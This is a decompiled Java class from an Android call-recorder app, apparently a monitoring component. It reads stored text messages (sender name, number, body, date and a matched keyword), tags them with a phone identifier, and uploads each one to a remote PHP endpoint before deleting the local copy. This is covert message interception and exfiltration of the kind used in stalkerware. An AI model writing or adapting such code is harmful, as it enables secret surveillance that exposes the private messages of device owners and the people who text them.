package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.I;
import a.c.b.h0;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendSMSAlert */
public class n implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f287b;

    /* renamed from: a reason: collision with root package name */
    private final Context f288a;

    public n(Context context) {
        this.f288a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f288a.stopService(new Intent(this.f288a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public void run() {
        String str = "";
        try {
            if (f287b) {
                a();
                return;
            }
            f287b = true;
            h0 h0Var = new h0(this.f288a);
            h0Var.b();
            Cursor c2 = h0Var.c();
            if (c2 != null && c2.getCount() > 0 && c2.moveToFirst()) {
                do {
                    I i = new I();
                    i.f55a = c2.getInt(0);
                    i.c(c2.getString(1));
                    i.d(c2.getString(2));
                    i.b(c2.getString(3));
                    i.a(c2.getInt(4));
                    i.a(c2.getString(5));
                    i.f56b = c2.getString(6);
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append(str);
                    sb.append(e.e(this.f288a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("name", i.c());
                    hashMap.put("number", i.d());
                    hashMap.put("message", i.b());
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str);
                    sb2.append(i.e());
                    hashMap.put("type", sb2.toString());
                    hashMap.put("date", i.a());
                    hashMap.put("keyword", i.f56b);
                    if (a.b("sms/insertSMSAlert.php", (Map<String, String>) hashMap)) {
                        h0Var.a(i.f55a);
                    }
                } while (c2.moveToNext());
            }
            h0Var.a();
            if (c2 != null) {
                c2.close();
            }
            f287b = false;
            a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
